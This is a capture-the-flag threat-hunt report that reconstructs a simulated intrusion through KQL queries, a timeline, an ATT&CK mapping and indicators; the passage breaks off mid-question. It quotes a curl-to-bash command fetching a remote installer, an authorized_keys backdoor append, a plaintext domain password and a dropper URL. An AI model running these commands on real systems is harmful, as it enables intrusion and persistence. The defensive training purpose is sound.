> **CONFIDENTIAL — THREAT HUNT REPORT**

# Ghost in the Stack

| Field | Detail |
|---|---|
| **Analyst** | umraffer32 |
| **Organisation** | Greenfield Technologies // Engineering Segment |
| **Date** | 23 May 2026 |
| **Hunt Type** | Proactive / CTF (LIVEHunt 05) |
| **Threat Actor** | Octo Tempest |
| **Status** | COMPLETE — 41 / 41 flags confirmed (Q00–Q41; Q35 not issued by platform) |

---

<details>
<summary><strong>Contents</strong></summary>

- [Executive Summary](#executive-summary)
- [Key Impact Metrics](#key-impact-metrics)
- [Environment](#environment)
- [Host Inventory](#host-inventory)
- [Attack Narrative](#attack-narrative)
- [Attack Flow (at a glance)](#attack-flow-at-a-glance)
- [Attack Timeline](#attack-timeline)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Cyber Kill Chain](#cyber-kill-chain)
- [Indicators of Compromise](#indicators-of-compromise)
- Hunt Phases
  - [Phase 00 — Mission Brief](#phase-00--mission-brief)
  - [Phase 01 — Inheritance (Scoping the Environment)](#phase-01--inheritance-scoping-the-environment)
  - [Phase 02 — Reconstruction (Implant Behaviour)](#phase-02--reconstruction-implant-behaviour)
  - [Phase 03 — Attribution](#phase-03--attribution)
  - [Phase 04 — First Pivot (Linux to Windows)](#phase-04--first-pivot-linux-to-windows)
  - [Phase 05 — Second Pivot (Windows Payload Delivery)](#phase-05--second-pivot-windows-payload-delivery)
  - [Phase 06 — Aftermath (Containment and Detection Engineering)](#phase-06--aftermath-containment-and-detection-engineering)

</details>

---

## Executive Summary

Octo Tempest, a financially motivated threat actor known for aggressive social engineering and cross-platform intrusion, established a persistent foothold on Linux workstation `GF-DEV01` within the Greenfield engineering environment on April 30, 2026. The initial compromise was trivial: user `a.kumar` executed a single curl-to-bash command from their shell at 21:54 UTC, fetching and running an installer from `dl.abordsecurity.space` (hosted behind Cloudflare CDN). The installer dropped `/tmp/helix-update` — a Sliver C2 implant — which detached from its parent process chain via nohup and continued running as PID 34616 under PPID 1. An existing SOC alert (CLOSED-5) had flagged the install domain as a suspicious DNS lookup minutes earlier but was dismissed as baseline activity.

Over the next 104 minutes, the implant silently harvested credential material from the workstation via Linux auditd syscall watch keys: AWS credentials, SSH keys, Kubernetes configs, and Claude AI session data (`claude_data`) were all accessed. SSH keys recovered from `~/.ssh/config` provided credentials for both the `sancadmin` bastion account and domain user `t.harris`. At 22:57, the attacker injected an SSH backdoor into `a.kumar`'s `authorized_keys` file — the key comment `octotempest@operator` provides direct actor attribution to Octo Tempest.

Between 23:07 and 23:11, the implant — still running under `a.kumar`'s context — validated the harvested `t.harris` Windows credentials against `GF-WS01` (LogonType 3 failures-then-successes sourced from GF-DEV01's internal IP). At 23:39, the attacker authenticated to `GF-DEV01` as `sancadmin` from external IP `194.36.110.139` (AS9009, M247 Europe SRL), built an SSH local port forward through GF-DEV01 to tunnel RDP, and laterally moved to the Windows workstation at 23:47. This single RDP landing triggered four simultaneous SOC tickets (CLOSED-1 through CLOSED-4). The attacker performed SAMR enumeration on GF-WS01, then staged a multi-technique Windows payload delivery campaign — ligolo tunneling infrastructure, SMB drops, WinRM execution, and WMI lateral movement — all of which failed. The Windows payload `hbsync.exe` never appeared in `WindowsFile_CL`. Microsoft Defender for Cloud's agentless scanning (MDC) later flagged the ligolo binary (`/usr/local/bin/helix-sync`) as `HackTool:Linux/Ligolo.A!MTB`, while MDE produced only behavioural alerts on the same artefact.

At end-of-hunt, the Sliver implant remained running on GF-DEV01, the SSH backdoor was live in `authorized_keys`, and the C2 operator's probe of `194.36.110.139:9080` confirmed the infrastructure was still active.

---

## Key Impact Metrics

| Metric | Value |
|---|---|
| **Dwell Time** | ~2.5 hours (21:54 Apr 30 – ~00:21 UTC May 1, 2026) |
| **Hosts Affected** | 2 — `GF-DEV01` (Linux, fully compromised), `GF-WS01` (Windows, RDP accessed) |
| **Accounts Compromised** | 2 — `a.kumar` (initial access), `t.harris` (credentials exfiltrated, RDP used) |
| **Credential Surfaces Accessed** | `aws_creds` (1), `ssh_user_keys` (5), `kube_creds` (1), `claude_data` (6) — auditd watch-key read counts |
| **Backdoor Implanted** | SSH authorized_keys — `octotempest@operator` public key |
| **Implant** | `/tmp/helix-update` — Sliver C2 (Linux Go, PID 34616) |
| **Windows Payload Outcome** | Failed — `hbsync.exe` never delivered |
| **Threat Actor** | Octo Tempest |
| **Total Flags** | 41 / 41 confirmed (Q00–Q41; Q35 not issued by platform) |

---

## Environment

| Field | Value |
|---|---|
| **Platform** | Microsoft Sentinel |
| **Primary Tables** | `LinuxProcess_CL`, `LinuxShellHistory_CL`, `LinuxSyscall_CL`, `LinuxNetwork_CL`, `LinuxAuth_CL`, `LinuxFile_CL`, `WindowsAuth_CL`, `WindowsFile_CL`, `WindowsProcess_CL` |
| **Attack Window** | April 30, 2026 — 21:54 UTC onwards |
| **Target** | Greenfield Technologies — Engineering Segment |
| **Hunt Format** | LIVEHunt 05 (CTF) |
| **Workspace** | LAW-SilentCorridor (`94b3fda2-abe5-4af9-849a-a8b90d5c17ae`) |

---

## Host Inventory

| Host | Internal IP | OS | Role | Accounts Active | Notes |
|---|---|---|---|---|---|
| `GF-DEV01` | `10.1.0.120` | Linux | Engineering workstation / Beachhead | `a.kumar`, `sancadmin` (attacker) | Initial implant drop; credential harvesting; SSH backdoor; ligolo staging; all Windows pivot activity originated here |
| `GF-WS01` | `10.1.0.133` | Windows | Engineering workstation | `t.harris` | Reached via SSH port forward + RDP at 23:47; SAMR enumeration performed; Windows payload delivery failed |
| *(attacker)* | `10.1.0.119` | Linux (Kali) | Attacker tunnel endpoint (TKT-005) | — | Internal source IP of the attacker's RDP client; reached GF-WS01 by routing through the SSH local port forward on GF-DEV01 |

---

## Attack Narrative

At 21:54:56 UTC on April 30, 2026, user `a.kumar` ran a single command from their shell on `GF-DEV01`:

```
curl -fsSL https://dl.abordsecurity.space/install.sh | bash
```

The install script (fetched from a Cloudflare CDN-fronted domain) orchestrated a three-step drop: `curl` downloaded `/tmp/helix-update`, `chmod +x` made it executable, and `nohup` launched it detached. The pipeline forked two siblings off `-bash` PID 32260 — curl PID 34608 (fetching `install.sh`) and bash subshell PID 34609 (consuming the piped output) — and the subshell then spawned curl PID 34612 for the binary download. The install chain terminated normally, but the implant itself survived, reparented to PID 1 as `/tmp/helix-update` PID 34616, PPID 1. A pre-existing SOC alert (CLOSED-5, "suspicious DNS domain") had flagged `dl.abordsecurity.space` as anomalous between 21:50 and 22:05, directly overlapping the foothold timestamp. The alert was closed as baseline activity.

The Sliver implant (identified by its open-source Linux Go C2 characteristics, nohup/PPID=1 detach pattern, and later Sigma detection rule mapping) began C2 activity immediately, spawning child processes (PIDs 34739, 34935, 34956, 35250, 43047) for outbound connections. Linux auditd's syscall auditing (`LinuxSyscall_CL`) — writing to a separate channel from system logs — recorded the implant's credential harvesting in granular detail via watch keys. Over the implant's lifetime, it accessed: `aws:aws_creds`, `bash:ssh_user_keys`, `kubectl:kube_creds`, `ssh:ssh_user_keys`, and `claude_data` (Claude AI conversation logs — the most frequently read key, accessed 6 times). The `ssh_user_keys` audit key covers `~/.ssh/config`, which held credentials for both the `sancadmin` bastion jump host and domain user `t.harris` — the attacker's path to every downstream host.

At 22:57:52, the attacker — operating through the implant — executed an SSH authorized_keys injection on GF-DEV01:

```
echo "ssh-ed25519 <key-material-elided> octotempest@operator" >> authorized_keys
```

The key comment `octotempest@operator`, combined with the use of M247 Europe SRL hosting (AS9009, `194.36.110.139`) and the hit-and-run opportunistic credential recon pattern, attributes this intrusion to **Octo Tempest** — a threat actor tracked by Microsoft for financially motivated social engineering and cross-platform attacks.

Between 23:07 and 23:11, while the attacker was still operating exclusively through the implant under `a.kumar`'s context, `WindowsAuth_CL` recorded `t.harris` LogonType 3 failures followed by successes against GF-WS01, all sourced from `10.1.0.120` (GF-DEV01's internal IP). This is the implant validating the harvested `t.harris` credentials against the live Windows host before the human operator committed to an interactive session — the credential check originates from GF-DEV01 because that is where the implant is running, not because sancadmin authored it.

At 23:39:13, the attacker authenticated to GF-DEV01 as `sancadmin` from external IP `194.36.110.139` — the same IP as the implant's C2 infrastructure, 104 minutes after the implant first detached. All prior sancadmin logins had originated from internal IPs; the `SrcIpAddr` column in `LinuxAuth_CL` is the field that distinguishes this external TKT-003 session from legitimate bastion activity.

With validated `t.harris` credentials already confirmed and an interactive sancadmin shell on GF-DEV01, the attacker built an SSH local port forward through GF-DEV01 to tunnel RDP — `sshd` established an outbound connection to `10.1.0.133:3389` from GF-DEV01 (TKT-004), consistent with a port forward routing external RDP traffic through the compromised Linux host. At 23:47, `t.harris` landed on GF-WS01 via this tunnel, immediately triggering four simultaneous SOC case files (CLOSED-1 through CLOSED-4). The attacker performed SAMR enumeration on GF-WS01 — a Windows domain reconnaissance technique using the Server Message Block Remote Procedure Call interface.

The attacker then transitioned from reconnaissance to lateral expansion. Via SFTP (`/usr/lib/openssh/sftp-server`) as sancadmin, two artefacts were written to GF-DEV01: `/tmp/helix-sync` (the ligolo tunnel proxy binary) and `/tmp/hbsync.exe` (a Windows payload). Microsoft Defender for Cloud's agentless scanning detected `/usr/local/bin/helix-sync` as `HackTool:Linux/Ligolo.A!MTB` (TKT-008) — MDC's file-level scan caught the tool that MDE had only behaviourally alerted on (TKT-007). The attacker used sancadmin shell history to probe Windows lateral movement paths against GF-WS01 using the `t.harris` credentials recovered via `ssh_user_keys`:

- `smbclient` with `greenfield.local/t.harris%Summer2025!` targeting `C$\Windows\Temp`, `Users\t.harris\Desktop`, and share enumeration (`-L`) to locate writable destinations
- `pwsh Invoke-Command` via WinRM (port 5985)
- Python `wmi_exec.py` for WMI-based execution

A PowerShell dropper in sancadmin's shell history encoded its payload in two layers of base64. Decoded, it revealed: download URL `https://sync.abordsecurity.space/helix-build-agent.exe` and drop path `$env:TEMP\hbsync.exe`. The dropper's first objective (per the two-phase shell pattern) was persistence — establishing a foothold before attempting any destructive action. All delivery attempts failed: `WindowsFile_CL` contains no `hbsync.exe` write event, confirming the payload never landed on GF-WS01.

At 00:21:07 UTC on May 1, sancadmin probed the C2 infrastructure directly: `curl -I http://194.36.110.139:9080/` — the same C2 IP on port 9080, confirming the infrastructure remained operational at end-of-hunt. The Sliver implant (`helix-update`) was still running on GF-DEV01.

---

## Attack Flow (at a glance)

```
┌──────────────────────┐                               ┌────────────────────────┐
│  Attacker / Operator │                               │   C2 Infrastructure    │
│   (Kali  10.1.0.119) │                               │  194.36.110.139:9080   │
│                      │                               │     AS9009 / M247      │
└──────────┬───────────┘                               └────────────┬───────────┘
           │                                                        │
           │  ssh sancadmin (23:39)                  Sliver beacon  │
           │  ssh -L localport:10.1.0.133:3389         (child PIDs) │
           ▼                                                        ▼
  ┌────────────────────────────────────────────────────────────────────────┐
  │                    GF-DEV01   (Linux  10.1.0.120)                      │
  │  ─────────────────────────────────────────────────────────────────────  │
  │  21:54  a.kumar  →  curl … | bash   →   /tmp/helix-update  (PID 34616) │
  │                                              │  PPID 1  (nohup detach) │
  │                              auditd reads:  ssh_user_keys,  aws_creds, │
  │                                             kube_creds,  claude_data   │
  │  22:57  authorized_keys += "ssh-ed25519 …  octotempest@operator"       │
  │  23:07  implant validates t.harris creds →  GF-WS01                    │
  │  23:39  sancadmin SSH from 194.36.110.139    (external — TKT-003)      │
  │  ~23:50 sftp-server drops  /tmp/helix-sync  +  /tmp/hbsync.exe         │
  └─────────────────────────────────┬──────────────────────────────────────┘
                                    │  SSH local port-forward
                                    │  → 10.1.0.133:3389  (RDP)
                                    ▼
  ┌────────────────────────────────────────────────────────────────────────┐
  │                    GF-WS01   (Windows  10.1.0.133)                     │
  │  ─────────────────────────────────────────────────────────────────────  │
  │  23:47  t.harris RDP landing  →  CLOSED-1..4 fire simultaneously       │
  │  23:47  SAMR enumeration                                               │
  │  ~00:00 Windows payload delivery attempts: smb / winrm / wmi  →  FAIL  │
  │         hbsync.exe never appears in WindowsFile_CL                     │
  └────────────────────────────────────────────────────────────────────────┘
```

---

## Attack Timeline

| Time (UTC) | Phase | Event |
|---|---|---|
| Apr 30 21:50 | Detection Gap | CLOSED-5: SOC alert fires on `dl.abordsecurity.space` DNS query — dismissed as baseline |
| Apr 30 21:54:51 | Initial Access | `curl` downloads `/tmp/helix-update` on GF-DEV01 as `a.kumar` |
| Apr 30 21:54:56 | Execution | `chmod +x /tmp/helix-update` |
| Apr 30 21:54:56 | Execution / C2 | `nohup /tmp/helix-update` — implant PID 34616 / PPID 1 detaches and begins C2 |
| Apr 30 21:54:56–23:59 | Collection | Implant directly reads `claude_data`; C2 child PIDs (34739, 34935, 34956, 35250, 43047) harvest the remaining surfaces — auditd records `aws_creds`, `ssh_user_keys`, `kube_creds` (via children) and `claude_data` (via implant) |
| Apr 30 22:57:52 | Persistence | `echo ssh-ed25519 …octotempest@operator >> authorized_keys` injected into `a.kumar` homedir |
| Apr 30 23:07–23:11 | Credential Validation | Implant (under `a.kumar` context) validates `t.harris` credentials against GF-WS01 — LogonType 3 failures/successes sourced from `10.1.0.120` (GF-DEV01) |
| Apr 30 23:39:13 | Attacker Reentry | `sancadmin` SSH from external IP `194.36.110.139` (AS9009) — first attacker-controlled authenticated session |
| Apr 30 23:47 | Lateral Movement | SSH port forward via GF-DEV01 → `t.harris` RDP to GF-WS01 — triggers CLOSED-1 through CLOSED-4 |
| Apr 30 23:47 | Discovery | SAMR enumeration performed on GF-WS01 |
| Apr 30 ~23:50 | Staging | SFTP writes `/tmp/helix-sync` (ligolo) and `/tmp/hbsync.exe` to GF-DEV01; `helix-sync.service` systemd unit created |
| Apr 30 ~23:59–May 1 00:21 | Lateral Movement Attempt | smbclient, WinRM, WMI, PowerShell dropper all fail — `hbsync.exe` never written to `WindowsFile_CL` |
| May 1 00:21:07 | C2 Probe | `curl -I http://194.36.110.139:9080/` — C2 infrastructure confirmed still active |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | Command and Scripting Interpreter: Unix Shell | T1059.004 | `curl -fsSL … \| bash` — shell-based installer delivery |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | `nohup /tmp/helix-update` — implant launched via shell |
| Execution | Native API | T1106 | Sliver implant uses direct syscalls (openat, connect) recorded via auditd |
| Persistence | SSH Authorized Keys | T1098.004 | `octotempest@operator` public key appended to `authorized_keys` |
| Persistence | Create or Modify System Process: Systemd Service | T1543.002 | `/etc/systemd/system/helix-sync.service` created for ligolo (dormant) |
| Defense Evasion | Masquerading | T1036 | `helix-update`, `helix-sync` binary names mimic legitimate update tooling; nohup detach reparents implant to PID 1, hiding it from session-based process trees |
| Credential Access | Unsecured Credentials: Private Keys | T1552.004 | `ssh_user_keys` audit key — `~/.ssh/config` accessed for SSH credentials |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 | `aws_creds`, `kubectl:kube_creds`, `claude_data` audit keys — implant reads credential files |
| Discovery | Account Discovery | T1087 | SAMR enumeration on GF-WS01 post-RDP |
| Defense Evasion | Valid Accounts: Domain Accounts | T1078.002 | Implant-driven `t.harris` LogonType 3 failure-then-success pattern against GF-WS01 — using harvested valid creds to evade detection during pre-pivot validation |
| Lateral Movement | Remote Services: SSH | T1021.004 | SSH port forward via GF-DEV01 tunnelling RDP to GF-WS01 |
| Lateral Movement | Remote Services: Remote Desktop Protocol | T1021.001 | `t.harris` RDP to GF-WS01 at 23:47 |
| Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 | smbclient targeting `C$\Windows\Temp` (attempted, failed) |
| Lateral Movement | Windows Management Instrumentation | T1047 | `wmi_exec.py` (attempted, failed) |
| Lateral Movement | Remote Services: Windows Remote Management | T1021.006 | `pwsh Invoke-Command` port 5985 (attempted, failed) |
| Command and Control | Protocol Tunneling | T1572 | SSH local port forward proxying attacker's RDP through GF-DEV01 |
| Command and Control | Application Layer Protocol | T1071 | Sliver C2 beacon to `194.36.110.139` via child processes |

---

## Cyber Kill Chain

| Phase | Activity | Hunt Flags |
|---|---|---|
| Reconnaissance | Octo Tempest identified `a.kumar` and GF-DEV01 credentials; built `dl.abordsecurity.space` installer infrastructure on AS9009 (M247) | Q14, Q16 |
| Weaponisation | Compiled Sliver C2 implant (`helix-update`); hosted `install.sh` on Cloudflare CDN-fronted domain | — |
| Delivery | `a.kumar` executed `curl -fsSL … \| bash` from shell — user-initiated, no exploit required | Q02, Q05, Q29 |
| Exploitation | `install.sh` executed: `chmod`, `nohup` launch; implant detaches from process tree as PPID 1 | Q03–Q05, Q07 |
| Installation | SSH `authorized_keys` backdoor injected with `octotempest@operator` key; `helix-sync.service` systemd unit created; tools staged via SFTP | Q12–Q13, Q15, Q28, Q38 |
| Command & Control | Sliver C2 child PIDs beam out to `194.36.110.139`; sancadmin SSH session from same IP at 23:39 — anomalous `SrcIpAddr` is the discriminator | Q08–Q09, Q26, Q30, Q37 |
| Actions on Objective | Credential harvesting (`aws_creds`, `ssh_user_keys`, `kube_creds`, `claude_data`); Windows pivot via port-forward + RDP; lateral movement attempted and failed | Q10–Q11, Q17, Q19–Q25, Q39–Q40 |

> Post-hunt response and detection-engineering questions (Q00, Q01, Q06, Q18, Q27, Q31–Q34, Q36, Q41) sit outside the kill chain proper — they cover schema awareness, alert closure analysis, containment ordering, Sigma authoring, and end-state characterisation.

---

## Indicators of Compromise

**Infrastructure:**
- C2 IP: `194.36.110.139` (AS9009, M247 Europe SRL)
- C2 Port: `9080` (HTTP probe confirmed active)
- Installer Domain: `dl.abordsecurity.space` (Cloudflare CDN, fronted at `104.21.57.185`)
- Windows Payload Domain: `sync.abordsecurity.space`

**Files and Artefacts:**
- `/tmp/helix-update` — Sliver C2 implant (running, PID 34616)
- `/tmp/helix-sync` — Ligolo tunnel proxy (staged via SFTP)
- `/usr/local/bin/helix-sync` — Ligolo binary (detected: `HackTool:Linux/Ligolo.A!MTB`)
- `/etc/systemd/system/helix-sync.service` — systemd unit file (dormant)
- `/tmp/hbsync.exe` — Windows payload (staged on Linux, never delivered to Windows)
- `/tmp/wmi_exec.py` — WMI lateral movement helper
- `/home/a.kumar/.ssh/authorized_keys` — modified with `octotempest@operator` key

**Network Indicators:**
- C2 subprocess PIDs (process-level): `34739, 34935, 34956, 35250, 43047`
- Attacker SSH source IP: `194.36.110.139` (sancadmin, dst port 22)
- Attacker Kali internal source IP: `10.1.0.119` (RDP client reaching GF-WS01 via the SSH local port forward on GF-DEV01)
- Windows payload download URL: `https://sync.abordsecurity.space/helix-build-agent.exe`

**Account and Credential Indicators:**
- Compromised account (initial): `a.kumar` on GF-DEV01
- Attacker-used account: `sancadmin` (SSH from `194.36.110.139`)
- Exfiltrated credentials: `greenfield.local/t.harris%Summer2025!`
- Backdoor SSH key comment: `octotempest@operator`

**Detection Artefacts:**
- CLOSED-5: DNS alert on `dl.abordsecurity.space` (21:50–22:05) — false-negative closure
- CLOSED-1 through CLOSED-4: Triggered simultaneously at 23:47 on `t.harris` RDP landing
- TKT-003: sancadmin external SSH from `194.36.110.139`
- TKT-004: sshd outbound `10.1.0.133:3389` — SSH port forward indicator
- TKT-007: MDE behavioural alert on `/usr/local/bin/helix-sync`
- TKT-008: MDC agentless `HackTool:Linux/Ligolo.A!MTB` signature on `/usr/local/bin/helix-sync`

---

<details>
<summary><strong>Query Conventions</strong></summary>

All queries target the `LAW-SilentCorridor` workspace (`94b3fda2-abe5-4af9-849a-a8b90d5c17ae`). The attack window is **April 30, 2026** in the `TimeGenerated` column; no ingestion-timestamp offset correction is needed (unlike Silent Corridor's `SilentCorridorX_CL` which required a `> datetime(2026-04-07T14:00:00Z)` gate).

Key table gotchas:
- `LinuxProcess_CL` and `LinuxAuth_CL` use `DvcHostname` for the host field (not `Computer` or `DeviceName`)
- `LinuxShellHistory_CL`, `LinuxNetwork_CL`, `LinuxSyscall_CL` use `Computer` for the host field
- `LinuxProcess_CL` has no `TargetProcessParentId` column — recover PPID via `extract(@"ParentProcessId[^0-9]*([0-9]+)", 1, tostring(EventOriginalMessage))`
- `LinuxSyscall_CL.Ppid` is an integer — filter as `Ppid == 34616`, not a string
- `WindowsAuth_CL` uses `TargetUsername` for the account and `SrcIpAddr` for source IP
- Auditd `AuditKey` values reflect the watch-key name configured in auditd rules, not file paths

</details>

---

## Phase 00 — Mission Brief

<details>
<summary><strong>Q00 — Environment Access · <code>Tier-2 hunter ready</code></strong></summary>

**Goal**
Accept the mission brief and confirm Tier-2 analyst readiness.

**Approach**
The gate phrase was embedded in the briefing's format hint. No query required.

**Flag**
`Tier-2 hunter ready`

</details>

---

## Phase 01 — Inheritance (Scoping the Environment)

<details>
<summary><strong>Q01 — Scoping · <code>LinuxAuth_CL</code></strong></summary>

**Goal**
Identify the custom log table containing Linux authentication events for the Greenfield environment.

**Approach**
Read the data dictionary directly. The Greenfield dataset is distributed across purpose-built `_CL` tables rather than a single unified table like Silent Corridor's `SilentCorridorX_CL`. The data dictionary listed `LinuxAuth_CL` as the authentication log table — covering SSH logins, sudo events, and PAM authentication on Linux hosts. No query required.

**Flag**
`LinuxAuth_CL`

> **Lesson:** When a hunt uses a multi-table schema rather than a single ingestion table, the data dictionary is mandatory reading before writing a single query. Knowing which table holds which data type prevents wasted query attempts against the wrong schema.

</details>

<details>
<summary><strong>Q02 — Triage · <code>curl -fsSL https://dl.abordsecurity.space/install.sh | bash</code></strong></summary>

**Goal**
Identify the initial command that triggered the compromise on GF-DEV01.

**Approach**
`LinuxShellHistory_CL` records every shell command typed by a user. Scoped to GF-DEV01 in a tight window around the suspected compromise time and sorted chronologically to read the session that preceded the implant.

**Query Used**
```kql
LinuxShellHistory_CL
| where Computer == "GF-DEV01"
| where TimeGenerated between(datetime(2026-04-30T21:30:00Z) .. datetime(2026-04-30T22:30:00Z))
| project TimeGenerated, ShellUser, Command
| order by TimeGenerated asc
```

**Results**
The query surfaced `a.kumar`'s shell session at 21:54:56. The command immediately preceding the implant's first process event was the curl-to-bash one-liner fetching `install.sh` from `dl.abordsecurity.space`.

**Flag**
`curl -fsSL https://dl.abordsecurity.space/install.sh | bash`

> **Lesson:** Shell history is the most literal record of what a user typed. For Linux foothold questions, `LinuxShellHistory_CL` scoped to a narrow time window around the first suspicious event produces a clean, ordered command timeline — no inference required.

</details>

<details>
<summary><strong>Q03 — Triage · <code>chmod, curl, nohup</code></strong></summary>

**Goal**
Identify the three binaries the install script invoked to stage and launch the implant.

**Approach**
`LinuxProcess_CL` on GF-DEV01 in the few seconds around the install timestamp surfaces every process spawned during the install chain.

**Query Used**
```kql
LinuxProcess_CL
| where DvcHostname == "GF-DEV01"
| where TimeGenerated between(datetime(2026-04-30T21:54:50Z) .. datetime(2026-04-30T21:56:00Z))
| project TimeGenerated, TargetProcessFilePath, TargetProcessCommandLine,
          ActingProcessFilePath, ActingProcessCommandLine
| order by TimeGenerated asc
```

**Results**
Three distinct process events appeared in rapid succession at 21:54:51–56: `curl` downloading `/tmp/helix-update`, `chmod +x /tmp/helix-update`, and `nohup /tmp/helix-update` to detach it from the terminal.

**Flag**
`chmod, curl, nohup`

> **Lesson:** Process creation records in `LinuxProcess_CL` cover every child spawned by the installer script in order. A narrow time window around the foothold timestamp reads like a step-by-step install log — each binary's role (download, permission, launch) is unambiguous.

</details>

<details>
<summary><strong>Q04 — Reconstruction · <code>32260 -> 34608 -> 34609</code></strong></summary>

**Goal**
Reconstruct the PID chain from the user's shell session to the bash subshell that ultimately downloaded and ran the implant.

**Approach**
Read the process parentage from the Q03 `LinuxProcess_CL` results. The user's `-bash` session (PID 32260) spawned the first `curl` (PID 34608) to fetch `install.sh`; the pipe operator fed the output into a bash subshell (PID 34609), which then spawned the second `curl` (PID 34612) to download `helix-update`. The question asks for the three-hop chain up to the subshell.

**Flag**
`32260 -> 34608 -> 34609`

> **Lesson:** Pipe-chained commands create an intermediate bash subshell in the process tree. The chain is `user shell → curl (installer fetch) → bash subshell (executes piped script)`. Understanding this separates the installer download from the payload download and correctly assigns the parent-child relationships.

</details>

<details>
<summary><strong>Q05 — Triage · <code>a.kumar</code></strong></summary>

**Goal**
Identify the user account that executed the malicious command.

**Approach**
The Q02 shell history results already projected `ShellUser` alongside the command. `a.kumar`'s session at 21:54:56 was the row containing the curl-to-bash command.

**Flag**
`a.kumar`

> **Lesson:** Always include the user field in shell history queries. The `ShellUser` column in `LinuxShellHistory_CL` provides immediate account attribution — no separate join to auth logs is needed to confirm who typed the command.

</details>

<details>
<summary><strong>Q06 — Gap Analysis · <code>CLOSED-5</code></strong></summary>

**Goal**
Identify which existing SOC case file covered the initial access window but failed to trigger an active investigation.

**Approach**
Reviewed the T2 Case File briefing document provided with the hunt. The briefing listed all pre-existing SOC tickets. CLOSED-5 described a "suspicious DNS domain" alert with a detection window of 21:50–22:05 — which directly overlapped the `dl.abordsecurity.space` query at 21:54 and was closed as baseline.

**Flag**
`CLOSED-5`

> **Lesson:** CLOSED alerts are not remediated incidents — they are missed detections. When the initial foothold maps to a DNS domain that triggered an alert and was dismissed, that closure becomes a critical gap in the detection chain. Cross-referencing timestamps between foothold events and pre-existing alert windows is a standard step in hunt retrospective analysis.

</details>

---

## Phase 02 — Reconstruction (Implant Behaviour)

<details>
<summary><strong>Q07 — Reconstruction · <code>34616/1</code></strong></summary>

**Goal**
Identify the implant's PID and PPID after it detached from the install chain.

**Approach**
Queried `LinuxProcess_CL` for `/tmp/helix-update` to find the final runtime process entry — distinct from the install chain processes in Q03/Q04.

**Query Used**
```kql
LinuxProcess_CL
| where DvcHostname == "GF-DEV01"
| where TargetProcessFilePath contains "helix-update"
| extend ppid = extract(@"ParentProcessId[^0-9]*([0-9]+)", 1, tostring(EventOriginalMessage))
| project TimeGenerated, TargetProcessId, ppid,
          TargetProcessFilePath, ActingProcessFilePath
| order by TimeGenerated asc
```

**Results**
The process event at 21:54:56.895 showed `/tmp/helix-update` as PID 34616, PPID 1. PPID 1 is the Linux init system — indicating the process was fully detached from the install session via `nohup` and reparented to the system's root process.

**Flag**
`34616/1`

> **Lesson:** PPID 1 is the defining signature of nohup/daemon-style detachment on Linux. A process with PPID 1 that was not launched by the init system itself is anomalous. Combined with a binary in `/tmp/`, this is a high-fidelity indicator of an attacker deliberately hiding their implant from session-based process visibility.

</details>

<details>
<summary><strong>Q08 — Pivot · <code>34739, 34935, 34956, 35250, 43047</code></strong></summary>

**Goal**
Identify the PIDs of processes spawned by the implant for C2 communication.

**Approach**
PID 34616 itself never appears in `LinuxNetwork_CL` — the implant delegates network I/O to child processes. Direct PPID extraction from `LinuxProcess_CL.EventOriginalMessage` only surfaces PID 34617 (a one-off `systemctl` spawn), so the C2 children are recovered indirectly: enumerate every distinct `ActingProcessId` in `LinuxNetwork_CL` from GF-DEV01 during the implant's lifetime with a non-loopback, non-RFC1918 destination. Exactly five PIDs match, all node/curl, all reaching out to Cloudflare/GitHub edge ranges.

**Query Used**
```kql
LinuxNetwork_CL
| where DvcHostname == "GF-DEV01"
| where TimeGenerated between(datetime(2026-04-30T21:54:56Z) .. datetime(2026-05-01T01:00:00Z))
| where DstIpAddr !startswith "10." and DstIpAddr !startswith "127."
    and DstIpAddr !startswith "172." and DstIpAddr !startswith "192.168."
    and DstIpAddr !startswith "0:0:0:0" and DstIpAddr != ""
| distinct ActingProcessId
| order by ActingProcessId asc
```

**Results**
Five distinct child PIDs with outbound external destination activity were identified across the implant's operational window: 34739, 34935, 34956, 35250, 43047. Note that PID 34616 itself does not appear in `LinuxNetwork_CL` — the implant delegates network I/O to child processes rather than making connections directly.

**Flag**
`34739, 34935, 34956, 35250, 43047`

> **Lesson:** C2 implants frequently spawn child processes for network communication rather than making connections directly from the implant PID — this breaks naive process-to-network correlation. The correct hunt pattern is: identify the implant PID first, then search for processes with that PID as parent in network or process tables.

</details>

<details>
<summary><strong>Q09 — Pivot · <code>LinuxSyscall_CL</code></strong></summary>

**Goal**
Identify which log table captured the implant's syscall-level activity including its credential access behaviour.

**Approach**
The implant's process creation and network events were already visible in `LinuxProcess_CL` and `LinuxNetwork_CL`. The syscall-level `openat` and `connect` calls recorded by Linux auditd land in a separate table. The data dictionary listed `LinuxSyscall_CL` as the auditd syscall capture table.

**Flag**
`LinuxSyscall_CL`

> **Lesson:** Linux auditd writes to a different log channel than process execution and network telemetry. When hunting file access patterns or syscall-level credential reads, `LinuxSyscall_CL` (or its equivalent) is the only table that captures this granularity. Process tables show what ran; syscall tables show what it touched.

</details>

<details>
<summary><strong>Q10 — Synthesis · <code>aws:aws_creds, bash:ssh_user_keys, kubectl:kube_creds, ssh:ssh_user_keys</code></strong></summary>

**Goal**
Enumerate every distinct credential surface the implant accessed, expressed as `Comm:AuditKey` pairs.

**Approach**
Queried `LinuxSyscall_CL` across the implant's lifetime with PPID filter on 34616, aggregating by `Comm` (the process name) and `AuditKey` (the auditd watch-key name).

**Query Used**
```kql
LinuxSyscall_CL
| where Computer =~ "GF-DEV01"
| where TimeGenerated between(datetime(2026-04-30T21:54:56Z) .. datetime(2026-04-30T23:59:54Z))
| where Ppid == 34616
| where AuditType == "SYSCALL"
| summarize n=count() by Comm, AuditKey
| order by Comm asc
```

**Results**
Four distinct `Comm:AuditKey` combinations returned: `aws:aws_creds`, `bash:ssh_user_keys`, `kubectl:kube_creds`, `ssh:ssh_user_keys`. Each watch key represents a category of credential files configured in the auditd rules.

**Flag**
`aws:aws_creds, bash:ssh_user_keys, kubectl:kube_creds, ssh:ssh_user_keys`

> **Lesson:** Auditd watch keys provide semantic labels for file access patterns — the key name tells you what category of credential was touched without requiring you to enumerate every possible file path. The `Comm:AuditKey` pair gives both the tool context (what process accessed it) and the credential category simultaneously.

</details>

<details>
<summary><strong>Q11 — Synthesis · <code>claude_data</code></strong></summary>

**Goal**
